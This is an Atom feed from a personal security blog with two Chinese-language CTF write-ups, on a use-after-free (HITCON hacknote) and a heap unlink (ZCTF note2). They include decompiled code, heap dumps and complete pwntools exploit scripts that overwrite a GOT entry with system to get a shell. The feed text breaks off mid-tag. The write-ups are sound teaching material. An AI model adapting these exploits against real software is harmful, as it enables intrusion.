<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>K&#39;s House</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://kabeor.github.io/"/>
  <updated>2020-01-06T04:23:59.896Z</updated>
  <id>https://kabeor.github.io/</id>
  
  <author>
    <name>kabeor</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>堆溢出-Use After Free</title>
    <link href="https://kabeor.github.io/%E5%A0%86%E6%BA%A2%E5%87%BA-Use%20After%20Free/"/>
    <id>https://kabeor.github.io/堆溢出-Use After Free/</id>
    <published>2020-01-06T04:21:43.321Z</published>
    <updated>2020-01-06T04:23:59.896Z</updated>
    
    <content type="html"><![CDATA[<h1 id="堆溢出-Use-After-Free"><a href="#堆溢出-Use-After-Free" class="headerlink" title="堆溢出-Use After Free"></a>堆溢出-Use After Free</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>当一个内存块被释放之后再次被使用。</p><ul><li>内存块被释放后，其对应的指针被设置为 NULL ， 然后再次使用，自然程序会崩溃。</li><li>内存块被释放后，其对应的指针没有被设置为 NULL ，然后在它下一次被使用之前，没有代码对这块内存块进行修改，那么<strong>程序很有可能可以正常运转</strong>。</li><li>内存块被释放后，其对应的指针没有被设置为 NULL，但是在它下一次使用之前，有代码对这块内存进行了修改，那么当程序再次使用这块内存时，<strong>就很有可能会出现奇怪的问题</strong>。</li></ul><p><strong>一般称被释放后没有被设置为 NULL 的内存指针为 dangling pointer。</strong></p><h2 id="例-HITCON-training-lab-10-hacknote"><a href="#例-HITCON-training-lab-10-hacknote" class="headerlink" title="例 HITCON-training lab 10 hacknote"></a>例 HITCON-training lab 10 hacknote</h2><h3 id="功能"><a href="#功能" class="headerlink" title="功能"></a>功能</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">puts</span>(<span class="string">"----------------------"</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"       HackNote       "</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"----------------------"</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">" 1. Add note          "</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">" 2. Delete note       "</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">" 3. Print note        "</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">" 4. Exit              "</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"----------------------"</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">"Your choice :"</span>);</span><br></pre></td></tr></table></figure><h3 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">del_note</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [esp+4h] [ebp-14h]</span></span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [esp+8h] [ebp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v3; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Index :"</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">4u</span>);</span><br><span class="line">  v1 = atoi(&amp;buf);</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt; <span class="number">0</span> || v1 &gt;= count )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Out of bound!"</span>);</span><br><span class="line">    _exit(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( notelist[v1] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">free</span>(*(notelist[v1] + <span class="number">1</span>));         <span class="comment">////////////free后指针没有设为NULL</span></span><br><span class="line">    <span class="built_in">free</span>(notelist[v1]);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Success"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p>申请一个size=16的note查看堆布局</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x/20gx 0x804b198</span><br><span class="line">0x804b198:0x00000011000000000x0804b1b00804865b  ========&gt; 8 字节内存存放note中的put以及content指针。</span><br><span class="line">0x804b1a8:0x00000021000000000x6161616161616161</span><br><span class="line">0x804b1b8:0x61616161616161610x0000000000000000</span><br><span class="line">0x804b1c8:0x00021e39000000000x0000000000000000</span><br></pre></td></tr></table></figure><p>显然 note 是一个 fastbin chunk（大小为 16 字节）。我们的目的是希望一个 note 的 put 字段为 magic 的函数地址，那么我们必须想办法让某个 note 的 put 指针被覆盖为 magic 地址。由于程序中只有唯一的地方对 put 进行赋值。所以我们必须利用写 real content 的时候来进行覆盖。具体采用的思路如下</p><ul><li>申请 note0，real content size 为 16（大小与 note 大小所在的 bin 不一样即可）</li><li>申请 note1，real content size 为 16（大小与 note 大小所在的 bin 不一样即可）</li><li>释放 note0</li><li>释放 note1</li><li>此时，大小为 16 的 fast bin chunk 中链表为 note1-&gt;note0</li><li>申请 note2，并且设置 real content 的大小为 8，那么根据堆的分配规则</li><li>note2 其实会分配 note1 对应的内存块。</li><li>real content 对应的 chunk 其实是 note0。</li><li>如果我们这时候向 note2 real content 的 chunk 部分写入 magic 的地址，那么由于我们没有 note0 为 NULL。当我们再次尝试输出 note0 的时候，程序就会调用 magic 函数。</li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">释放note 0 - note 1后</span><br><span class="line">pwndbg&gt; x/20gx 0x804b198-0x10</span><br><span class="line">0x804b188:0x00000000000000000x0000000000000000</span><br><span class="line">0x804b198:0x00000011000000000x0804b01000000000  ---------再次申请将被分配</span><br><span class="line">0x804b1a8:0x00000021000000000x0804b01000000000</span><br><span class="line">0x804b1b8:0x61616161616161610x0000000000000000</span><br><span class="line">0x804b1c8:0x00000011000000000x0804b0100804b1a0</span><br><span class="line">0x804b1d8:0x00000021000000000x0804b0100804b1b0</span><br><span class="line">0x804b1e8:0x62626262626262620x0000000000000000</span><br><span class="line">0x804b1f8:0x00021e09000000000x0000000000000000</span><br><span class="line">0x804b208:0x00000000000000000x0000000000000000</span><br><span class="line">0x804b218:0x00000000000000000x0000000000000000</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">note2填充&apos;c&apos;*8后</span><br><span class="line">pwndbg&gt; x/20gx 0x804b198-0x20</span><br><span class="line">0x804b178:0x00000000000000000x0000000000000000</span><br><span class="line">0x804b188:0x00000000000000000x0000000000000000</span><br><span class="line">0x804b198:0x00000011000000000x6363636363636363  ------分配位置，将被调用，改为magic地址get shell</span><br><span class="line">0x804b1a8:0x00000021000000000x0804b01000000000</span><br><span class="line">0x804b1b8:0x61616161616161610x0000000000000000</span><br><span class="line">0x804b1c8:0x00000011000000000x0804b1a00804865b</span><br><span class="line">0x804b1d8:0x00000021000000000x0804b0100804b1b0</span><br><span class="line">0x804b1e8:0x62626262626262620x0000000000000000</span><br><span class="line">0x804b1f8:0x00021e09000000000x0000000000000000</span><br></pre></td></tr></table></figure><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = process(<span class="string">'./hacknote'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">addnote</span><span class="params">(size, content)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"1"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(size))</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delnote</span><span class="params">(idx)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"2"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">printnote</span><span class="params">(idx)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"3"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(r)</span></span><br><span class="line">magic = <span class="number">0x08048986</span></span><br><span class="line"></span><br><span class="line">addnote(<span class="number">32</span>, <span class="string">"aaaa"</span>) <span class="comment"># add note 0</span></span><br><span class="line">addnote(<span class="number">32</span>, <span class="string">"ddaa"</span>) <span class="comment"># add note 1</span></span><br><span class="line"></span><br><span class="line">delnote(<span class="number">0</span>) <span class="comment"># delete note 0</span></span><br><span class="line">delnote(<span class="number">1</span>) <span class="comment"># delete note 1</span></span><br><span class="line"></span><br><span class="line">addnote(<span class="number">8</span>, p32(magic)) <span class="comment"># add note 2</span></span><br><span class="line"></span><br><span class="line">printnote(<span class="number">0</span>) <span class="comment"># print note 0</span></span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>From <a href="https://kabeor.github.io/堆溢出-Use After Free/">https://kabeor.github.io/堆溢出-Use After Free/</a> bye</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;堆溢出-Use-After-Free&quot;&gt;&lt;a href=&quot;#堆溢出-Use-After-Free&quot; class=&quot;headerlink&quot; title=&quot;堆溢出-Use After Free&quot;&gt;&lt;/a&gt;堆溢出-Use After Free&lt;/h1&gt;&lt;h2 id=&quot;原
      
    
    </summary>
    
      <category term="Pwn" scheme="https://kabeor.github.io/categories/Pwn/"/>
    
    
      <category term="Pwn" scheme="https://kabeor.github.io/tags/Pwn/"/>
    
  </entry>
  
  <entry>
    <title>堆溢出-Unlink</title>
    <link href="https://kabeor.github.io/%E5%A0%86%E6%BA%A2%E5%87%BA-Unlink/"/>
    <id>https://kabeor.github.io/堆溢出-Unlink/</id>
    <published>2020-01-05T13:25:57.021Z</published>
    <updated>2020-01-06T04:24:05.431Z</updated>
    
    <content type="html"><![CDATA[<h1 id="堆溢出-Unlink"><a href="#堆溢出-Unlink" class="headerlink" title="堆溢出-Unlink"></a>堆溢出-Unlink</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p><img src="https://i.loli.net/2020/01/05/rsipB2cPVI7lFtv.png" alt></p><p>对 fd 和 bk 的检查</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//对 fd 和 bk 的检查</span></span><br><span class="line"><span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))</span><br><span class="line">  malloc_printerr (check_action, <span class="string">"corrupted double-linked list"</span>, P, AV);</span><br></pre></td></tr></table></figure><p>通过覆盖，将 nextchunk 的 FD 指针指向了 fakeFD，将 nextchunk 的 BK 指针指向了 fakeBK 。那么为了通过验证，我们需要</p><ul><li><code>fakeFD -&gt; bk == P</code> &lt;=&gt; <code>*(fakeFD + 12) == P</code></li><li><code>fakeBK -&gt; fd == P</code> &lt;=&gt; <code>*(fakeBK + 8) == P</code></li></ul><p>当满足上述两式时，可以进入 Unlink 的环节，进行如下操作：</p><ul><li><code>fakeFD -&gt; bk = fakeBK</code> &lt;=&gt; <code>*(fakeFD + 12) = fakeBK</code></li><li><code>fakeBK -&gt; fd = fakeFD</code> &lt;=&gt; <code>*(fakeBK + 8) = fakeFD</code></li></ul><p>如果让 fakeFD + 12 和 fakeBK + 8 指向同一个指向 P 的指针，那么：</p><ul><li><code>*P = P - 8</code></li><li><code>*P = P - 12</code></li></ul><p>即通过此方式，P 的指针指向了比自己低 12 的地址处。此方法虽然不可以实现任意地址写，但是可以修改指向 chunk 的指针，这样的修改是可以达到一定的效果的。</p><h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><h3 id="条件"><a href="#条件" class="headerlink" title="条件"></a>条件</h3><ol><li>UAF ，可修改 free 状态下 smallbin 或是 unsorted bin 的 fd 和 bk 指针</li><li>已知位置存在一个指针指向可进行 UAF 的 chunk</li></ol><h3 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h3><p>使得已指向 UAF chunk 的指针 ptr 变为 ptr - 0x18</p><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>设指向可 UAF chunk 的指针的地址为 ptr</p><ol><li>修改 fd 为 ptr - 0x18</li><li>修改 bk 为 ptr - 0x10</li><li>触发 unlink</li></ol><p>ptr 处的指针会变为 ptr - 0x18。</p><p>64位：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">fd = &amp;P-0x18</span><br><span class="line">bk = &amp;P-0x10</span><br><span class="line">效果： P = &amp;P-0X18</span><br></pre></td></tr></table></figure><p>32 位</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">fd = &amp;p-12</span><br><span class="line">bk = &amp;p-8</span><br><span class="line">效果: p =&amp;p-12</span><br></pre></td></tr></table></figure><h2 id="例-2016-ZCTF-note2"><a href="#例-2016-ZCTF-note2" class="headerlink" title="例 2016 ZCTF note2"></a>例 2016 ZCTF note2</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">功能</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"1.New note\n2.Show  note\n3.Edit note\n4.Delete note\n5.Quit\noption---&gt;&gt;"</span>);</span><br></pre></td></tr></table></figure><h3 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">新建note</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sub_400B96</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *size_4; <span class="comment">// ST08_8</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v2; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> size; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( dword_602160 &gt; <span class="number">3</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"note lists are full"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Input the length of the note content:(less than 128)"</span>);</span><br><span class="line">  size = sub_400A4A(<span class="string">"Input the length of the note content:(less than 128)"</span>);</span><br><span class="line">  <span class="keyword">if</span> ( size &gt; <span class="number">0x80</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"Too long"</span>);</span><br><span class="line">  size_4 = <span class="built_in">malloc</span>(size);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Input the note content:"</span>);</span><br><span class="line">  sub_4009BD(size_4, size, <span class="number">10</span>);         <span class="comment">////////////读取函数，漏洞点</span></span><br><span class="line">  sub_400B10(size_4);</span><br><span class="line">  *(&amp;ptr + dword_602160) = size_4;</span><br><span class="line">  qword_602140[dword_602160] = size;</span><br><span class="line">  v2 = dword_602160++;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">"note add success, the id is %d\n"</span>, v2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __int64 __<span class="function">fastcall <span class="title">sub_4009BD</span><span class="params">(__int64 a1, __int64 a2, <span class="keyword">char</span> a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v4; <span class="comment">// [rsp+Ch] [rbp-34h]</span></span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+2Fh] [rbp-11h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 i; <span class="comment">// [rsp+30h] [rbp-10h]      变量类型为unsigned，因此0-1=unsigned最大值</span></span><br><span class="line">  <span class="keyword">ssize_t</span> v7; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = a3;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0L</span>L; a2 - <span class="number">1</span> &gt; i; ++i )          <span class="comment">//////// 令a2=0，将循环unsigned最大值次，可以造成堆溢出</span></span><br><span class="line">  &#123;</span><br><span class="line">    v7 = read(<span class="number">0</span>, &amp;buf, <span class="number">1u</span>LL);</span><br><span class="line">    <span class="keyword">if</span> ( v7 &lt;= <span class="number">0</span> )</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    <span class="keyword">if</span> ( buf == v4 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    *(i + a1) = buf;</span><br><span class="line">  &#125;</span><br><span class="line">  *(a1 + i) = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>程序在每次编辑 note 时，都会申请 0xa0 大小的内存，但是在 free 之后并没有设置为 NULL。</p><h3 id="利用-1"><a href="#利用-1" class="headerlink" title="利用"></a>利用</h3><p>note操作如下</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p = process(<span class="string">'./note2'</span>)</span><br><span class="line">note2 = ELF(<span class="string">'./note2'</span>)</span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">newnote</span><span class="params">(length, content)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'option---&gt;&gt;'</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'(less than 128)'</span>)</span><br><span class="line">    p.sendline(str(length))</span><br><span class="line">    p.recvuntil(<span class="string">'content:'</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">shownote</span><span class="params">(id)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'option---&gt;&gt;'</span>)</span><br><span class="line">    p.sendline(<span class="string">'2'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'note:'</span>)</span><br><span class="line">    p.sendline(str(id))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">editnote</span><span class="params">(id, choice, s)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'option---&gt;&gt;'</span>)</span><br><span class="line">    p.sendline(<span class="string">'3'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'note:'</span>)</span><br><span class="line">    p.sendline(str(id))</span><br><span class="line">    p.recvuntil(<span class="string">'2.append]'</span>)</span><br><span class="line">    p.sendline(str(choice))</span><br><span class="line">    p.sendline(s)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">deletenote</span><span class="params">(id)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'option---&gt;&gt;'</span>)</span><br><span class="line">    p.sendline(<span class="string">'4'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'note:'</span>)</span><br><span class="line">    p.sendline(str(id))</span><br></pre></td></tr></table></figure><h4 id="构造三个chunk用于实现unlink"><a href="#构造三个chunk用于实现unlink" class="headerlink" title="构造三个chunk用于实现unlink"></a>构造三个chunk用于实现unlink</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p.recvuntil(<span class="string">'Input your name:'</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Input your address:'</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># chunk0: a fake chunk</span></span><br><span class="line">ptr = <span class="number">0x0000000000602120</span></span><br><span class="line">fakefd = ptr - <span class="number">0x18</span></span><br><span class="line">fakebk = ptr - <span class="number">0x10</span></span><br><span class="line">content = <span class="string">'a'</span> * <span class="number">8</span> + p64(<span class="number">0x61</span>) + p64(fakefd) + p64(fakebk) + <span class="string">'b'</span> * <span class="number">64</span> + p64(<span class="number">0x60</span>)</span><br><span class="line"><span class="comment">#content = p64(fakefd) + p64(fakebk)</span></span><br><span class="line">newnote(<span class="number">128</span>, content)</span><br><span class="line"><span class="comment"># chunk1: a zero size chunk produce overwrite</span></span><br><span class="line">newnote(<span class="number">0</span>, <span class="string">'a'</span> * <span class="number">8</span>)</span><br><span class="line"><span class="comment"># chunk2: a chunk to be overwrited and freed</span></span><br><span class="line">newnote(<span class="number">0x80</span>, <span class="string">'b'</span> * <span class="number">16</span>)</span><br></pre></td></tr></table></figure><p>chunk0 中一共构造了两个 chunk</p><ul><li>chunk ptr[0]，这个是为了 unlink 时修改对应的值。</li><li><p>chunk ptr[0]’s nextchunk，这个是为了使得 unlink 时的第一个检查满足。</p><p>  // 由于P已经在双向链表中，所以有两个地方记录其大小，所以检查一下其大小是否一致。<br>  if (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), 0))      \</p><pre><code>malloc_printerr (&quot;corrupted size vs. prev_size&quot;);    </code></pre></li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">当前堆内构造</span><br><span class="line">pwndbg&gt; x/50xg 0x144d280</span><br><span class="line">0x144d280:0x00000000000000000x0000000000000000</span><br><span class="line">0x144d290:0x00000000000000000x0000000000000091  ======&gt; chunk0   size=0x80</span><br><span class="line">0x144d2a0:0x61616161616161610x0000000000000061</span><br><span class="line">0x144d2b0:0x00000000006021080x0000000000602110 ------&gt; fd  bk</span><br><span class="line">0x144d2c0:0x62626262626262620x6262626262626262</span><br><span class="line">0x144d2d0:0x62626262626262620x6262626262626262</span><br><span class="line">0x144d2e0:0x62626262626262620x6262626262626262</span><br><span class="line">0x144d2f0:0x62626262626262620x6262626262626262</span><br><span class="line">0x144d300:0x00000000000000600x0000000000000000 ------&gt; prev_size=0x60</span><br><span class="line">0x144d310:0x00000000000000000x0000000000000000</span><br><span class="line">0x144d320:0x00000000000000000x0000000000000021  ======&gt; chunk1   size=0</span><br><span class="line">0x144d330:0x61616161616161610x0000000000000000</span><br><span class="line">0x144d340:0x00000000000000000x0000000000000091  ======&gt; chunk2   size=0x80</span><br><span class="line">0x144d350:0x62626262626262620x6262626262626262</span><br><span class="line">0x144d360:0x00000000000000000x0000000000000000</span><br><span class="line">0x144d370:0x00000000000000000x0000000000000000</span><br><span class="line">0x144d380:0x00000000000000000x0000000000000000</span><br><span class="line">0x144d390:0x00000000000000000x0000000000000000</span><br><span class="line">0x144d3a0:0x00000000000000000x0000000000000000</span><br><span class="line">0x144d3b0:0x00000000000000000x0000000000000000</span><br><span class="line">0x144d3c0:0x00000000000000000x0000000000000000</span><br><span class="line">0x144d3d0:0x00000000000000000x0000000000020c31  ======&gt; top chunk</span><br></pre></td></tr></table></figure><h4 id="释放-chunk1-覆盖-chunk2-释放-chunk2"><a href="#释放-chunk1-覆盖-chunk2-释放-chunk2" class="headerlink" title="释放 chunk1 - 覆盖 chunk2 - 释放 chunk2"></a>释放 chunk1 - 覆盖 chunk2 - 释放 chunk2</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># edit the chunk1 to overwrite the chunk2</span></span><br><span class="line">deletenote(<span class="number">1</span>)</span><br><span class="line">content = <span class="string">'a'</span> * <span class="number">16</span> + p64(<span class="number">0xa0</span>) + p64(<span class="number">0x90</span>)</span><br><span class="line">newnote(<span class="number">0</span>, content)</span><br><span class="line"><span class="comment"># delete note 2 to trigger the unlink</span></span><br><span class="line"><span class="comment"># after unlink, ptr[0] = ptr - 0x18</span></span><br><span class="line">deletenote(<span class="number">2</span>)</span><br></pre></td></tr></table></figure><p>首先释放 chunk1，由于该 chunk 属于 fastbin，所以下次在申请的时候仍然会申请到该 chunk，同时由于上面所说的类型问题，我们可以读取任意字符，所以就可以覆盖 chunk2</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">当前堆内构造</span><br><span class="line">pwndbg&gt; x/50xg 0x1a94280</span><br><span class="line">0x1a94280:0x00000000000000000x0000000000000000</span><br><span class="line">0x1a94290:0x00000000000000000x0000000000000091  ======&gt; chunk0   size=0x80</span><br><span class="line">0x1a942a0:0x61616161616161610x0000000000000061</span><br><span class="line">0x1a942b0:0x00000000006021080x0000000000602110 ------&gt; fd  bk   ptr[0]</span><br><span class="line">0x1a942c0:0x62626262626262620x6262626262626262</span><br><span class="line">0x1a942d0:0x62626262626262620x6262626262626262</span><br><span class="line">0x1a942e0:0x62626262626262620x6262626262626262</span><br><span class="line">0x1a942f0:0x62626262626262620x6262626262626262</span><br><span class="line">0x1a94300:0x00000000000000600x0000000000000000 ------&gt; fake prev_size=0x60   unused</span><br><span class="line">0x1a94310:0x00000000000000000x0000000000000000</span><br><span class="line">0x1a94320:0x00000000000000000x0000000000000021  ======&gt; chunk1   size=0</span><br><span class="line">0x1a94330:0x61616161616161610x6161616161616161</span><br><span class="line">0x1a94340:0x00000000000000a00x0000000000000090 </span><br><span class="line">0x1a94350:0x00000000000000000x0000000001a94010</span><br><span class="line">0x1a94360:0x00000000000000000x0000000000000000</span><br><span class="line">0x1a94370:0x00000000000000000x0000000000000000</span><br><span class="line">0x1a94380:0x00000000000000000x0000000000000000</span><br><span class="line">0x1a94390:0x00000000000000000x0000000000000000</span><br><span class="line">0x1a943a0:0x00000000000000000x0000000000000000</span><br><span class="line">0x1a943b0:0x00000000000000000x0000000000000000</span><br><span class="line">0x1a943c0:0x00000000000000000x0000000000000000</span><br><span class="line">0x1a943d0:0x00000000000000000x0000000000020c31</span><br><span class="line">0x1a943e0:0x00000000000000000x0000000000000000</span><br></pre></td></tr></table></figure><p>覆盖主要是为了释放 chunk2 的时候可以后向合并（合并低地址），对 chunk0 中虚拟构造的 chunk 进行 unlink。即将要执行的操作为 unlink(ptr[0])，unlink 成功执行，会导致 ptr[0] 所存储的地址变为 fakebk，即 ptr-0x18。</p><h4 id="获取-system-地址"><a href="#获取-system-地址" class="headerlink" title="获取 system 地址"></a>获取 system 地址</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># overwrite the chunk0(which is ptr[0]) with got atoi</span></span><br><span class="line">atoi_got = note2.got[<span class="string">'atoi'</span>]</span><br><span class="line">content = <span class="string">'a'</span> * <span class="number">0x18</span> + p64(atoi_got)</span><br><span class="line">editnote(<span class="number">0</span>, <span class="number">1</span>, content)</span><br><span class="line"><span class="comment"># get the aoti addr</span></span><br><span class="line">shownote(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'is '</span>)</span><br><span class="line">atoi_addr = p.recvuntil(<span class="string">'\n'</span>, drop=<span class="keyword">True</span>)</span><br><span class="line"><span class="keyword">print</span> atoi_addr</span><br><span class="line">atoi_addr = u64(atoi_addr.ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line"><span class="keyword">print</span> <span class="string">'leak atoi addr: '</span> + hex(atoi_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment"># get system addr</span></span><br><span class="line">atoi_offest = libc.symbols[<span class="string">'atoi'</span>]</span><br><span class="line">libcbase = atoi_addr - atoi_offest</span><br><span class="line">system_offest = libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">system_addr = libcbase + system_offest</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">'leak system addr: '</span>, hex(system_addr)</span><br></pre></td></tr></table></figure><p>前面已经修改 ptr[0] 的内容为 ptr 的地址 - 0x18，所以当再次编辑 note0 时，可以覆盖 ptr[0] 的内容。这里将其覆盖为 atoi 的地址。 这样的话，如果查看 note 0 的内容，其实查看的就是 atoi 的地址。之后我们根据 libc 中对应的偏移计算出 system 的地址。</p><h4 id="修改-atoi-got"><a href="#修改-atoi-got" class="headerlink" title="修改 atoi got"></a>修改 atoi got</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># overwrite the atoi got with systemaddr</span></span><br><span class="line">content = p64(system_addr)</span><br><span class="line">editnote(<span class="number">0</span>, <span class="number">1</span>, content)</span><br></pre></td></tr></table></figure><p>此时 ptr[0] 的地址 got 表的地址，所以可以直接修改该 note，覆盖为 system 地址。</p><h4 id="get-shell"><a href="#get-shell" class="headerlink" title="get shell"></a>get shell</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># get shell</span></span><br><span class="line">sh.recvuntil(<span 